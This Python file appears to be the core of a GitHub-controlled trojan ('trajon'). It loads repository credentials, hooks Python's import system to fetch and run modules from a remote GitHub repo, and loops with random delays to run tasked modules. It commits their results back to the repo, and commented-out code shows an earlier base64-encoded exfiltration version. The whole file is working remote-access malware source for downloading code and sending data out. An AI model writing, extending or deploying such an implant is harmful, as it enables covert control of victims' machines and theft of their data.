# -*- coding: utf-8 -*-

import json
# import base64
import sys
import time
# import imp
import random
import threading
import queue
import argparse
from pelo_utils.plaintext_module_importer import ModuleImporter
from pelo_utils.git_connecter import GitConnecter
# from github3 import login

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--path", type = str, default = "C:/pelo/github_info.json")
args = parser.parse_args()
path = args.path

json_flie = open(path)
json_obj = json.load(json_flie)

username = json_obj["user"]
password = json_obj["pass"]
repository = json_obj["repo"]

trajon_id = "abc"

trajon_config = "%s.json" % trajon_id
data_path = "data/%s/" % trajon_id
trajon_modules = []
configured = False
task_queue = queue.Queue()

git_connecter = GitConnecter(username, password, repository)
sys.meta_path.insert(0, ModuleImporter(git_connecter.get_file_contents))

def module_runnner(modulename):
    task_queue.put(1)
    result = sys.modules[modulename].run()
    task_queue.get()
    git_connecter.store_module_result(result)

while True:
    if task_queue.empty():
        config = git_connecter.get_trajon_config()
        for task in config:
            t = threading.Thread(target=module_runnner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))


# def connect_to_github():
#     print("user:%s, pass:%s, repo:%s" % (username, password, repository))
#     gh = login(username = username, password = password)
#     repo = gh.repository(username, repository)
#     branch = repo.branch("master")
#     return gh,repo,branch

# def get_file_contents(filepath):
#     # connect to github
#     gh,repo,branch = connect_to_github()
#     # get last commit
#     commit = repo.commits().next()
#     tree = repo.tree(commit.sha).recurse()

#     for filename in tree.tree:
#         if filepath in filename.path:
#             print("[*] Found file %s" % filepath)
#             blob = repo.blob(filename._json_data['sha'])
#             return blob.get_file_content    
#     return None

# def get_trajon_config():
#     global configured
#     config_json = get_file_contents(trajon_config)
#     config = json.load(base64.b64decode(config_json))
#     configured = True

#     for task in config:
#         if task['module'] not in sys.modules:
#             exec("import %s" % task['module'])
    
#     return config

# def store_module_result(data):
#     gh,repo,branch = connect_to_github()
#     remote_path = "data/%s/%d.data" % (trajon_id, random.randint(1000, 100000))
#     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
#     return
